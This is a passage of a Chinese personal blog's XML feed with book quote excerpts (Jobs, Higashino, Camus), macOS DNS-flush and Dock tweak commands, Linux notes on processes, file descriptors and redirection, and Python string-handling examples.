6</h3><p><strong>简洁并不仅仅是视觉上的，也不仅仅是把杂乱无章的东西变少或者抹掉，而是要挖掘复杂性的深度。</strong>要想获得简洁，你就必须要挖的足够深。打个比方，如果你是为了在产品上不装螺丝钉，那你最后可能会造出一个极其繁琐复杂的东西。<strong>更好的方式，是更深刻地理解“简洁”一词，理解他的每一个部分，以及它是如何制造的。你必须深刻的把握产品的精髓，从而判断出哪些不重要的部件是可以拿掉的。</strong></p><h3 id="7"><a href="#7" class="headerlink" title="# 7"></a># 7</h3><p><strong>记住自己很快就要死了，这是我面对人生重大选择时最重要的工具。因为，几乎一切——所有外界的期望，所有骄傲，所有对于困窘和失败的恐惧——这些东西都在死亡面前烟消云散，只留下真正重要的东西。记住自己终会死去，是我所知最好的方式，避免陷入认为自己会失去什么的陷阱。你已是一无所有，没理由不追随内心。</strong></p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摘录</tag>
      
      <tag>史蒂夫·乔布斯</tag>
      
      <tag>沃尔特·艾萨克森</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS清除DNS缓存</title>
    <link href="/posts/8ea63c18/"/>
    <url>/posts/8ea63c18/</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo killall -HUP mDNSRespondersudo killall mDNSResponderHelpersudo dscacheutil -flushcache</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《假面山庄》摘录</title>
    <link href="/posts/ff70973a/"/>
    <url>/posts/ff70973a/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《假面山庄》东野圭吾</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>人在谈论别人的事时，都能保持冷静，一旦遇到和自己密切相关的事，就会突然感情用事，难以决断。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>大部分人在痛苦面前都会选择放弃。一旦身处困境，首先想的就是逃避，要不就是自暴自弃、萎靡不振，把自己当成悲剧的主人公。</p><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>我希望自己对人人都好，但我这么对你，并不单单是这个原因。</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>假面山庄</tag>
      
      <tag>东野圭吾</tag>
      
      <tag>摘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux:进程与线程、文件描述符与重定向(补)</title>
    <link href="/posts/991f3e43/"/>
    <url>/posts/991f3e43/</url>
    
    <content type="html"><![CDATA[<h3 id="Q1：与Windows下进程线程区别？"><a href="#Q1：与Windows下进程线程区别？" class="headerlink" title="Q1：与Windows下进程线程区别？"></a>Q1：与Windows下进程线程区别？</h3><p>Windows中<code>进程</code>只是作为<strong>资源的拥有者</strong>，并不是实际任务的执行者，<strong>实际的执行</strong>靠<code>线程</code>实现。</p><p>一个进程可以拥有多个线程，多个线程共享进程拥有的资源，同时可能具有自己的独占资源。在具体执行任务时由线程来使用处理机。 </p><p>Windows中，进程实现靠createProcess实现。而createProcess有一大堆的参数，不过很多时候都默认为null。其作用相当于创建一个进程的同时创建一个线程（一般一个）。</p><p>而Linux中<strong>在 Linux 系统中，进程和线程几乎没有区别</strong>。</p><p>进程和线程都是实际运行的存在，都有一个类似的进程描述符（而Windows中线程不具有进程描述符，只描述一些少量的独有资源，所以很轻量）。</p><p><em>线程看起来跟进程没有区别，只是线程的某些数据区域和其父进程是共享的，而子进程是拷贝副本，而不是共享</em>。</p><h3 id="Q2：如何理解Linux-shell中的“2-gt-amp-1”？"><a href="#Q2：如何理解Linux-shell中的“2-gt-amp-1”？" class="headerlink" title="Q2：如何理解Linux shell中的“2&gt;&amp;1”？"></a>Q2：如何理解Linux shell中的“2&gt;&amp;1”？</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.&#x2F;test.sh  &gt; log.txt 2&gt;&amp;1</code></pre></div><p>上面的调用表明将<code>./test.sh</code>的输出重定向到<code>log.txt</code>文件中，同时将标准错误也重定向到<code>log.txt</code>文件中。</p><p>每个程序在运行后，都会至少打开三个文件描述符，分别是0：标准输入；1：标准输出；2：标准错误。例如，对于前面的test.sh脚本它至少打开了三个文件描述符（可以在<code>/proc/&lt;pid&gt;/fd</code>目录下查到）。</p><p>那么现在就容易理解前面的疑问了，<code>2&gt;&amp;1</code>表明将文件描述2（标准错误输出）的内容重定向到文件描述符1（标准输出），为什么1前面需要&amp;？当没有&amp;时，1会被认为是一个普通的文件，<strong>有&amp;表示重定向的目标不是一个文件，而是一个文件描述符</strong>。在前面我们知道，test.sh &gt;log.txt又将文件描述符1的内容重定向到了文件log.txt，那么最终标准错误也会重定向到log.txt。</p><p>可以在<code>/proc/&lt;pid&gt;/fd</code>目录下查到重定向的情况文件，<strong>文件描述符1和2都指向了log.txt文件，</strong>也就得到了我们最终想要的效果：<strong>将标准错误输出重定向到文件中</strong>。</p><blockquote><p>程序运行后会打开三个文件描述符，分别是标准输入，标准输出和标准错误输出。</p><p>在调用脚本时，可使用2&gt;&amp;1来将标准错误输出重定向。</p><p>只需要查看脚本的错误时，可将标准输出重定向到文件，而标准错误会打印在控制台，便于查看。</p><p><code>&gt;&gt;log.txt</code>会将重定向内容追加到log.txt文件末尾。</p><p>通过查看<code>/proc/&lt;pid&gt;/fd</code>下的内容，可了解进程打开的文件描述符信息。</p></blockquote><h3 id="Q3：为什么command-gt-file-2-gt-amp-1-不可以？"><a href="#Q3：为什么command-gt-file-2-gt-amp-1-不可以？" class="headerlink" title="Q3：为什么command &gt; file 2&gt;&amp;1 不可以？"></a>Q3：为什么<code>command &gt; file 2&gt;&amp;1 </code>不可以？</h3><ul><li>对于<code>command &gt; file 2&gt;&amp;1</code>:</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 初始状态0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>首先是<code>command &gt; file</code>将标准输出重定向到<code>file</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># command &gt; file0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p><code>2&gt;&amp;1</code>是标准错误拷贝了标准输出的行为，也就是同样被重定向到<code>file</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; file</code></pre></div><p>最终结果就是标准输出和错误都被重定向到file中，正确。</p><ul><li>而对于<code>command 2&gt;&amp;1 &gt;file 2&gt;&amp;1</code>:</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 初始状态0 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>首先是<code>2&gt;&amp;1</code>，<strong>标准错误拷贝了标准输出的行为，但此时标准输出还是在终端</strong>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; &#x2F;dev&#x2F;pts&#x2F;72 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p><code>&gt;file</code>后输出才被重定向到file，但标准错误仍然保持在终端。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 2&gt;&amp;10 -&gt; &#x2F;dev&#x2F;pts&#x2F;71 -&gt; file2 -&gt; &#x2F;dev&#x2F;pts&#x2F;7</code></pre></div><p>所以达不到标准错误输出重定向的效果。</p><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/47765176">https://zhuanlan.zhihu.com/p/47765176</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>进程</tag>
      
      <tag>线程</tag>
      
      <tag>文件描述符</tag>
      
      <tag>重定向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux:进程与线程、文件描述符与重定向</title>
    <link href="/posts/a2b8485c/"/>
    <url>/posts/a2b8485c/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在使用重定向的过程中，对文件描述符有一些疑惑。学习过程中涉及到一些Linux下的进程线程知识。</p></blockquote><h2 id="1-Linux进程与线程"><a href="#1-Linux进程与线程" class="headerlink" title="1. Linux进程与线程"></a>1. Linux进程与线程</h2><blockquote><p>先说结论：<strong>在 Linux 系统中，进程和线程几乎没有区别</strong>。</p></blockquote><h3 id="1-1-Linux进程"><a href="#1-1-Linux进程" class="headerlink" title="1.1 Linux进程"></a>1.1 Linux进程</h3><p>抽象的来说，计算机即下图所示。</p><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/pro.jpg"></p><p>这个大的矩形表示计算机的<strong>内存空间</strong>，其中的小矩形代表<strong>进程</strong>，左下角的圆形表示<strong>磁盘</strong>，右下角的图形表示一些<strong>输入输出设备</strong>，比如鼠标键盘显示器等等。</p><p>另外，注意到内存空间被划分为了两块，上半部分表示<strong>用户空间</strong>，下半部分表示<strong>内核空间</strong>。</p><p>用户空间装着用户进程需要使用的资源，比如你在程序代码里开一个数组，这个数组肯定存在用户空间；内核空间存放内核进程需要加载的系统资源，这一些资源一般是不允许用户访问的。但是注意有的用户进程会共享一些内核空间的资源，比如一些动态链接库等等。</p><p>我们用 C 语言写一个 hello 程序，编译后得到一个可执行文件，在命令行运行就可以打印出一句 hello world，然后程序退出。在操作系统层面，就是新建了一个进程，这个进程将我们编译出来的可执行文件读入内存空间，然后执行，最后退出。</p><p><strong>你编译好的那个可执行程序只是一个文件</strong>，不是进程，可执行文件必须要载入内存，包装成一个进程才能真正跑起来。进程是要依靠操作系统创建的，每个进程都有它的固有属性，比如进程号（PID）、进程状态、打开的文件等等，进程创建好之后，读入你的程序，你的程序才被系统执行。</p><p>那么，操作系统是如何创建进程的呢？<strong>对于操作系统，进程就是一个数据结构</strong>，我们直接来看 Linux 的源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">struct task_struct &#123;    &#x2F;&#x2F; 进程状态    long              state;    &#x2F;&#x2F; 虚拟内存结构体    struct mm_struct  *mm;    &#x2F;&#x2F; 进程号    pid_t              pid;    &#x2F;&#x2F; 指向父进程的指针    struct task_struct __rcu  *parent;    &#x2F;&#x2F; 子进程列表    struct list_head        children;    &#x2F;&#x2F; 存放文件系统信息的指针    struct fs_struct        *fs;    &#x2F;&#x2F; 一个数组，包含该进程打开的文件指针    struct files_struct        *files;&#125;;</code></pre></div><p><code>task_struct</code>就是 Linux 内核对于一个进程的描述，也可以称为「进程描述符」。源码比较复杂，这里就截取了一小部分比较常见的。</p><p>其中比较有意思的是<code>mm</code>指针和<code>files</code>指针。<code>mm</code>指向的是进程的虚拟内存，也就是载入资源和可执行文件的地方；<code>files</code>指针指向一个数组，这个数组里装着所有该进程打开的文件的指针。</p><h3 id="1-2-Linux线程"><a href="#1-2-Linux线程" class="headerlink" title="1.2 Linux线程"></a>1.2 Linux线程</h3><p>为什么说 Linux 中线程和进程基本没有区别呢，因为从 Linux 内核的角度来看，并没有把线程和进程区别对待。</p><p>我们知道系统调用<code>fork()</code>可以新建一个子进程，函数<code>pthread()</code>可以新建一个线程。<strong>但无论线程还是进程，都是用<code>task_struct</code>结构表示的，唯一的区别就是共享的数据区域不同</strong>。</p><p>换句话说<em>，线程看起来跟进程没有区别，只是线程的某些数据区域和其父进程是共享的，而子进程是拷贝副本，而不是共享</em>。就比如说，<code>mm</code>结构和<code>files</code>结构在线程中都是共享的，可由下面两幅图看出：</p><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/thr1.jpg"></p><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/thr2.jpg"></p><p>所以说，我们的多线程程序要利用锁机制，避免多个线程同时往同一区域写入数据，否则可能造成数据错乱。</p><p>那么你可能问，<strong>既然进程和线程差不多，而且多进程数据不共享，即不存在数据错乱的问题，为什么多线程的使用比多进程普遍得多呢</strong>？</p><p>因为<strong>现实中数据共享的并发更普遍</strong>，比如十个人同时从一个账户取十元，我们希望的是这个共享账户的余额正确减少一百元，而不是希望每人获得一个账户的拷贝，每个拷贝账户减少十元。</p><p>当然，必须要说明的是，只有 Linux 系统将线程看做共享数据的进程，不对其做特殊看待，其他的很多操作系统是对线程和进程区别对待的，线程有其特有的数据结构，我个人认为不如 Linux 的这种设计简洁，增加了系统的复杂度。</p><p>在 Linux 中新建线程和进程的效率都是很高的，对于新建进程时内存区域拷贝的问题，Linux 采用了 copy-on-write 的策略优化，也就是并不真正复制父进程的内存空间，而是等到需要写操作时才去复制。<strong>所以 Linux 中新建进程和新建线程都是很迅速的</strong>。</p><h2 id="2-Linux文件描述符与重定向"><a href="#2-Linux文件描述符与重定向" class="headerlink" title="2. Linux文件描述符与重定向"></a>2. Linux文件描述符与重定向</h2><h3 id="2-1-文件描述符"><a href="#2-1-文件描述符" class="headerlink" title="2.1 文件描述符"></a>2.1 文件描述符</h3><p>在Linux源码对进程的描述中，具有一个<code>files</code>，它是一个文件指针数组。一般来说，一个进程会从<code>files[0]</code>读取输入，将输出写入<code>files[1]</code>，将错误信息写入<code>files[2]</code>。</p><p>举个例子，以我们的角度 C 语言的<code>printf</code>函数是向命令行打印字符，但是从进程的角度来看，就是向<code>files[1]</code>写入数据；同理，<code>scanf</code>函数就是进程试图从<code>files[0]</code>这个文件中读取数据。</p><p><strong>每个进程被创建时，</strong><code>files</code><strong>的前三位被填入默认值，分别指向标准输入流、标准输出流、标准错误流。我们常说的「文件描述符」就是指这个文件指针数组的索引</strong>，所以程序的文件描述符默认情况下 0 是输入，1 是输出，2 是错误。</p><p>可以重新画一幅图：</p><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/file1.jpg"></p><p>对于一般的计算机，输入流是键盘，输出流是显示器，错误流也是显示器，所以现在这个进程和内核连了三根线。因为硬件都是由内核管理的，我们的进程需要通过<em>「系统调用」</em>让内核进程访问硬件资源。</p><blockquote><p>不要忘了，Linux 中一切都被抽象成文件，设备也是文件，可以进行读和写。</p></blockquote><p>如果我们写的程序需要其他资源，比如打开一个文件进行读写，这也很简单，进行系统调用，让内核把文件打开，这个文件就会被放到<code>files</code>的第 4 个位置：</p><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/file2.jpg"></p><h3 id="2-2-重定向"><a href="#2-2-重定向" class="headerlink" title="2.2 重定向"></a>2.2 重定向</h3><p>明白了这个原理，<strong>输入重定向</strong>就很好理解了，程序想读取数据的时候就会去<code>files[0]</code>读取，所以我们只要把<code>files[0]</code>指向一个文件，那么程序就会从这个文件中读取数据，而不是从键盘：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ command &lt; file.txt</code></pre></div><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/file3.jpg"></p><p>同理，<strong>输出重定向</strong>就是把<code>files[1]</code>指向一个文件，那么程序的输出就不会写入到显示器，而是写入到这个文件中：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ command &gt; file.txt</code></pre></div><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/file4.jpg"></p><p>错误重定向也是一样的，就不再赘述。</p><p><strong>管道符</strong>其实也是异曲同工，把一个进程的输出流和另一个进程的输入流接起一条「管道」，数据就在其中传递，不得不说这种设计思想真的很优美：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cmd1 | cmd2 | cmd3</code></pre></div><p><img src="/image/Linux-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E3%80%81%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/pipe.jpg"></p><p>到这里，你可能也看出<em>「Linux 中一切皆文件」</em>设计思路的高明了，不管是设备、另一个进程、socket 套接字还是真正的文件，全部都可以读写，统一装进一个简单的<code>files</code>数组，进程通过简单的文件描述符访问相应资源，具体细节交于操作系统，有效解耦，优美高效。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>参考：</p><p><a href="https://labuladong.gitbook.io/algo/di-wu-zhang-ji-shu-wen-zhang-xi-lie/linux-jin-cheng">https://labuladong.gitbook.io/algo/di-wu-zhang-ji-shu-wen-zhang-xi-lie/linux-jin-cheng</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>进程</tag>
      
      <tag>线程</tag>
      
      <tag>文件描述符</tag>
      
      <tag>重定向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS中Dock栏使用空白分隔</title>
    <link href="/posts/f3c59bf0/"/>
    <url>/posts/f3c59bf0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>给Mac的Dock栏添加空白的图标用以分隔。</p></blockquote><h2 id="添加空白分割区"><a href="#添加空白分割区" class="headerlink" title="添加空白分割区"></a>添加空白分割区</h2><ul><li><p><strong>打开</strong><code>终端（Terminal.app）</code></p></li><li><p><strong>输入下列指令后，按回车键运行，空白区域就会添加到Dock中：</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock persistent-apps -array-add &#39;&#123;&quot;tile-type&quot;&#x3D;&quot;spacer-tile&quot;;&#125;&#39;; killall Dock</code></pre></div></li><li><p><strong>空白区域就是个透明图标，可以移动位置或拖离Dock栏，重复上方指令可添加多个</strong></p></li></ul><h2 id="只显示当前运行的应用"><a href="#只显示当前运行的应用" class="headerlink" title="只显示当前运行的应用"></a>只显示当前运行的应用</h2><ul><li><p><strong>打开</strong><code>终端（Terminal.app）</code></p></li><li><p><strong>输入下列指令后，按回车键运行，Dock栏只显示当前运行中的应用程序：</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock static-only -bool TRUE; killall Dock</code></pre></div></li><li><p><strong>想恢复原来状态，输入下列指令，按回车键运行即可：</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.dock static-only -bool FALSE; killall Dock</code></pre></div></li></ul><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/190175194">https://zhuanlan.zhihu.com/p/190175194</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>Dock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《局外人》摘录</title>
    <link href="/posts/515d6e7b/"/>
    <url>/posts/515d6e7b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《局外人》阿尔贝·加缪</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>一个人对他所不了解的东西，总是会有一些夸张失真的想法。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>所有身心健康的人，都或多或少设想期待过自己所爱的人的死亡。</p><h3 id="3"><a href="#3" class="headerlink" title="# 3"></a># 3</h3><p>为什么一个普通人身上的优点，到了罪犯身上就成为了他十恶不赦的罪状。</p><h3 id="4"><a href="#4" class="headerlink" title="# 4"></a># 4</h3><p>我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摘录</tag>
      
      <tag>局外人</tag>
      
      <tag>阿尔贝·加缪</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第二章:字符串和文本(2)</title>
    <link href="/posts/dae8b75d/"/>
    <url>/posts/dae8b75d/</url>
    
    <content type="html"><![CDATA[<h4 id="2-10-在正则式中使用Unicode"><a href="#2-10-在正则式中使用Unicode" class="headerlink" title="2.10 在正则式中使用Unicode"></a>2.10 在正则式中使用Unicode</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 在正则式中使用Unicode&quot;&quot;&quot; 你可以使用Unicode字符对应的转义序列(比如 \uFFF 或者 \UFFFFFFF )&quot;&quot;&quot;import rearabic &#x3D; re.compile(&#39;[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff]+&#39;)</code></pre></div><h4 id="2-11-删除字符串中不需要的字符"><a href="#2-11-删除字符串中不需要的字符" class="headerlink" title="2.11 删除字符串中不需要的字符"></a>2.11 删除字符串中不需要的字符</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 删除字符串中不需要的字符&quot;&quot;&quot; strip() 方法能用于删除开始或结尾的字符。 lstrip() 和 rstrip() 分别从左和从右执行删除操作。 默认情况下，这些方法会去除空白字符，但是你也可以指定其他字符。&quot;&quot;&quot;# Whitespace strippings &#x3D; &#39; hello world \n&#39;s.strip()  # &#39;hello world&#39;s.lstrip()  # &#39;hello world \n&#39;s.rstrip()  # &#39; hello world&#39;# Character strippingt &#x3D; &#39;-----hello&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;t.lstrip(&#39;-&#39;)  # &#39;hello&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;t.strip(&#39;-&#x3D;&#39;)  # &#39;hello&#39;</code></pre></div><h4 id="2-12-审查清理文本字符串"><a href="#2-12-审查清理文本字符串" class="headerlink" title="2.12 审查清理文本字符串"></a>2.12 审查清理文本字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 审查清理文本字符串&quot;&quot;&quot; 除了使用str.upper() 和 str.lower()变换大小写格式。str.replace() 或者 re.sub() 可以进行简单的替换操作。还可以使用 str.translate() 方法，即自己创造映射之后进行替换。&quot;&quot;&quot;s &#x3D; &#39;pýtĥöñ\fis\tawesome\r\n&#39;  # &#39;pýtĥöñ\x0cis\tawesome\r\n&#39;# 映射remap &#x3D; &#123;ord(&#39;\t&#39;): &#39; &#39;, ord(&#39;\f&#39;): &#39; &#39;, ord(&#39;\r&#39;): None&#125;# 替换a &#x3D; s.translate(remap)  # &#39;pýtĥöñ is awesome\n&#39;</code></pre></div><h4 id="2-13-字符串对齐"><a href="#2-13-字符串对齐" class="headerlink" title="2.13 字符串对齐"></a>2.13 字符串对齐</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串对齐&quot;&quot;&quot; 对于基本的字符串对齐操作，可以使用字符串的 ljust() , rjust() 和 center() 方法。所有这些方法都能接受一个可选的填充字符。&quot;&quot;&quot;text &#x3D; &#39;Hello World&#39;text.ljust(20)  # &#39;Hello World         &#39;text.rjust(20)  # &#39;         Hello World&#39;text.center(20)  # &#39;    Hello World     &#39;# 有填充字符text.rjust(20, &#39;&#x3D;&#39;)  # &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hello World&#39;text.center(20, &#39;*&#39;)  # &#39;****Hello World*****&#39;&quot;&quot;&quot; 函数 format() 同样可以用来很容易的对齐字符串。 你要做的就是使用 &lt;,&gt; 或者 ^ 字符后面紧跟一个指定的宽度。&quot;&quot;&quot;format(text, &#39;&gt;20&#39;)  # &#39;         Hello World&#39;format(text, &#39;&lt;20&#39;)  # &#39;Hello World         &#39;format(text, &#39;^20&#39;)  # &#39;    Hello World     &#39;&#39;&#123;:&gt;10s&#125; &#123;:&gt;10s&#125;&#39;.format(&#39;Hello&#39;, &#39;World&#39;)  # &#39;     Hello      World&#39;# 有填充字符format(text, &#39;&#x3D;&gt;20s&#39;)  # &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hello World&#39;format(text, &#39;*^20s&#39;)  # &#39;****Hello World*****&#39;</code></pre></div><h4 id="2-14-合并拼接字符串"><a href="#2-14-合并拼接字符串" class="headerlink" title="2.14 合并拼接字符串"></a>2.14 合并拼接字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 合并拼接字符串&quot;&quot;&quot; 如果字符串在一个list里或者iterable中，使用join()&quot;&quot;&quot;parts &#x3D; [&#39;Is&#39;, &#39;Chicago&#39;, &#39;Not&#39;, &#39;Chicago?&#39;]&#39; &#39;.join(parts)  # &#39;Is Chicago Not Chicago?&#39;&#39;,&#39;.join(parts)  # &#39;Is,Chicago,Not,Chicago?&#39;&#39;&#39;.join(parts)  # &#39;IsChicagoNotChicago?&#39;# 永远都不应该如下写s &#x3D; &#39;&#39;for p in parts:    s +&#x3D; p# 适当的时候可以使用生成器表达式&#39;,&#39;.join(str(d) for d in data)# 输出的时候没必要将字符串连接print(a, b, c, sep&#x3D;&#39;:&#39;)  # Better</code></pre></div><h4 id="2-15-字符串中插入变量"><a href="#2-15-字符串中插入变量" class="headerlink" title="2.15 字符串中插入变量"></a>2.15 字符串中插入变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串中插入变量&quot;&quot;&quot; 可以通过字符串的format()方法来解决。&quot;&quot;&quot;s &#x3D; &#39;&#123;name&#125; has &#123;n&#125; messages.&#39;s.format(name&#x3D;&#39;Guido&#39;, n&#x3D;37)  # &#39;Guido has 37 messages.&#39;&quot;&quot;&quot; 如果要被替换的变量能在变量域中找到， 那么你可以结合使用 format_map() 和 vars()。&quot;&quot;&quot;name &#x3D; &#39;Guido&#39;n &#x3D; 37s.format_map(vars())  # &#39;Guido has 37 messages.&#39;</code></pre></div><h4 id="2-16-以指定列宽格式化字符"><a href="#2-16-以指定列宽格式化字符" class="headerlink" title="2.16 以指定列宽格式化字符"></a>2.16 以指定列宽格式化字符</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 以指定列宽格式化字符&quot;&quot;&quot; 使用 textwrap 模块来格式化字符串的输出&quot;&quot;&quot;import osimport textwraps &#x3D; &quot;Look into my eyes, look into my eyes, the eyes, the eyes, \the eyes, not around the eyes, don&#39;t look around the eyes, \look into my eyes, you&#39;re under.&quot;# 输出以多少字符换行print(textwrap.fill(s, 70))print(textwrap.fill(s, 40))# 首行缩进print(textwrap.fill(s, 40, initial_indent&#x3D;&#39;    &#39;))# 次行及之后缩进print(textwrap.fill(s, 40, subsequent_indent&#x3D;&#39;    &#39;))# 获取终端大小尺寸os.get_terminal_size().columns</code></pre></div><h4 id="2-17-在字符串中处理html和xml"><a href="#2-17-在字符串中处理html和xml" class="headerlink" title="2.17 在字符串中处理html和xml"></a>2.17 在字符串中处理html和xml</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 在字符串中处理html和xml&quot;&quot;&quot; 使用html模块中的函数&quot;&quot;&quot;import htmls &#x3D; &#39;Elements are written as &quot;&lt;tag&gt;text&lt;&#x2F;tag&gt;&quot;.&#39;# 替换字符串中的尖括号print(html.escape(s))# Elements are written as &quot;&lt;tag&gt;text&lt;&#x2F;tag&gt;&quot;.# 将非ASCII文本对应的编码实体嵌入进去s &#x3D; &#39;Spicy Jalapeño&#39;s.encode(&#39;ascii&#39;, errors&#x3D;&#39;xmlcharrefreplace&#39;)# b&#39;Spicy Jalape&amp;#241;o&#39;# 使用HTML或者XML解析器的一些相关工具函数&#x2F;方法s 